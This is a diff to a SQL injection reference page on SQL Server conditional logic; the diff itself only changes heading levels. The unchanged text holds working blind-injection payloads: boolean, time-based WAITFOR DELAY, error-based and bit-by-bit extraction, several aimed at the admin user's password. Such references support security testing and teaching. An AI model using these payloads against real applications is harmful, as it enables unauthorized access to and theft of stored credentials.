@@ -7,13 +7,11 @@ tags: ["conditional logic", "case", "if", "blind injection"]
 lastUpdated: 2025-03-15
 ---
 
-## Conditional Statements
-
 Conditional statements are essential for blind SQL injection techniques and allow attackers to extract information by analyzing the application's response to different conditions. Microsoft SQL Server provides several methods for implementing conditional logic.
 
-### Basic Conditional Operators
+## Basic Conditional Operators
 
-#### IF Statement
+### IF Statement
 
 The `IF` statement evaluates a condition and executes a statement block when true:
 
@@ -46,7 +44,7 @@ Equivalent using CASE:
 SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 10 THEN 'Many users' ELSE 'Few users' END;
 ```
 
-#### CASE Expression
+### CASE Expression
 
 The `CASE` expression provides more flexible conditional logic:
 
@@ -78,7 +76,7 @@ SELECT username,
 FROM users
 ```
 
-#### IIF Function (SQL Server 2012+)
+### IIF Function (SQL Server 2012+)
 
 The `IIF` function is a shorthand for simple CASE expressions:
 
@@ -93,9 +91,9 @@ SELECT username, IIF(admin = 1, 'Administrator', 'Regular User') AS user_role
 FROM users
 ```
 
-### Conditional Logic in SQL Injection
+## Conditional Logic in SQL Injection
 
-#### Boolean-Based Blind Injection
+### Boolean-Based Blind Injection
 
 Conditional statements are the foundation of boolean-based blind injection:
 
@@ -107,7 +105,7 @@ Conditional statements are the foundation of boolean-based blind injection:
 ' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username = 'admin'), 1, 1)) = 65--
 ```
 
-#### Time-Based Blind Injection
+### Time-Based Blind Injection
 
 Combining conditional logic with time delays:
 
@@ -119,9 +117,9 @@ Combining conditional logic with time delays:
 ' IF ASCII(SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1)) = 65 WAITFOR DELAY '0:0:5'--
 ```
 
-### Advanced Conditional Techniques
+## Advanced Conditional Techniques
 
-#### Dynamic SQL with Conditions
+### Dynamic SQL with Conditions
 
 ```sql
 DECLARE @sql nvarchar(1000)
@@ -132,7 +130,7 @@ ELSE
 EXEC(@sql)
 ```
 
-#### Nested Conditions
+### Nested Conditions
 
 ```sql
 -- Nested CASE expressions
@@ -147,7 +145,7 @@ SELECT
   END
 ```
 
-#### Using UPDATE with Conditions
+### Using UPDATE with Conditions
 
 ```sql
 -- Using UPDATE with WHERE clause to implement conditional logic
@@ -156,7 +154,7 @@ UPDATE @result SET @result = 1 WHERE (SELECT COUNT(*) FROM users WHERE username 
 SELECT @result
 ```
 
-### Error-Based Extraction with Conditions
+## Error-Based Extraction with Conditions
 
 Using conditional logic to force errors that contain data:
 
@@ -170,16 +168,16 @@ Using conditional logic to force errors that contain data:
   )--
 ```
 
-### Practical Blind SQL Injection Examples
+## Practical Blind SQL Injection Examples
 
-#### Determining Table Existence
+### Determining Table Existence
 
 ```sql
 -- Check if a table exists
 ' AND (SELECT CASE WHEN EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN 1 ELSE 0 END) = 1--
 ```
 
-#### Extracting Data Bit by Bit
+### Extracting Data Bit by Bit
 
 ```sql
 -- Extract one character at a time
@@ -194,7 +192,7 @@ Using conditional logic to force errors that contain data:
 -- And so on for each bit...
 ```
 
-#### Conditional Logic with Binary Search
+### Conditional Logic with Binary Search
 
 ```sql
 -- Binary search approach to extract values efficiently
@@ -203,7 +201,7 @@ Using conditional logic to force errors that contain data:
     1, 1)) < 128)--
 ```
 
-### Handling NULL Values
+## Handling NULL Values
 
 NULL handling is important in conditional logic:
 
@@ -215,7 +213,7 @@ NULL handling is important in conditional logic:
 ' AND COALESCE((SELECT TOP 1 username FROM users WHERE email LIKE '%admin%'), '', 'unknown') = 'admin'--
 ```
 
-### Limitations and Considerations
+## Limitations and Considerations
 
 1. Complex conditions may hit query length limitations
 2. Execution time may increase with complex nested conditions
